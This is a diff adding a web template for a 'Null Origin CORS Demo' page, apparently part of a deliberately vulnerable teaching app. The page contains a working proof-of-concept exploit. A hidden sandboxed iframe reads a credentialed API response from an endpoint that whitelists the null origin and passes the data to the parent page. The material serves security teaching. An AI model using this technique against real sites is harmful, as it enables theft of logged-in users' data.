@@ -1,0 +1,28 @@
+{% extends "core/base.html" %}
+{% block title %}Null Origin CORS Demo{% endblock %}
+
+{% block content %}
+<h1>Null Origin CORS Demo</h1>
+<p class="text-muted">
+  This page simulates an attacker-controlled site. The sandboxed iframe
+  below uses a <code>data:</code> URI, which causes the browser to send
+  a literal <code>null</code> Origin header on any request the iframe's
+  script makes — exactly the value
+  <code>/a05/api/partner-directory</code> whitelists.
+</p>
+<div id="result" class="border rounded p-2 bg-body-secondary mb-3">(pending)</div>
+<iframe sandbox="allow-scripts" style="display:none"
+  src="data:text/html,
+  &lt;script&gt;
+    fetch(&quot;http://127.0.0.1:5001/a05/api/partner-directory&quot;, {credentials: &quot;include&quot;})
+      .then(r =&gt; r.json())
+      .then(j =&gt; parent.postMessage(JSON.stringify(j), &quot;*&quot;))
+      .catch(e =&gt; parent.postMessage(&quot;blocked: &quot; + e, &quot;*&quot;));
+  &lt;/script&gt;
+"></iframe>
+<script>
+window.addEventListener("message", function (event) {
+  document.getElementById("result").textContent = event.data;
+});
+</script>
+{% endblock %}
